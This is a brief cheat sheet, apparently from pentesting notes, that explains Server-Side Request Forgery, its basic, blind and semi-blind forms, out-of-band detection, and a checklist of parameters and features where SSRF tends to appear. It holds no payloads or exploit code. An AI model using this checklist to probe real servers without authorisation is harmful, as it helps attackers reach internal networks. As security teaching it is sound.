# Server-Side Request Forgery (SSRF)

> SSRF forces the server to make HTTP requests to unintended locations — internal network, cloud metadata, or arbitrary URLs.

---

## 🔍 Types of SSRF

### 1. Basic SSRF
- Server fetches URL you control
- Response visible in application

### 2. Blind SSRF
- Server makes request but response not shown
- Detected via out-of-band (Burp Collaborator, interactsh)

### 3. Semi-Blind SSRF
- Partial response or error messages visible

---

## 🎯 Where to Look for SSRF

```
- URL parameters: ?url=, ?uri=, ?path=, ?src=, ?redirect=
- Webhook functionality
- PDF/Screenshot generators
- Image fetching from URL
- Import from URL features
- File preview functionality
- SSO / OAuth callbacks
- API integrations
- XML/JSON with URLs
```

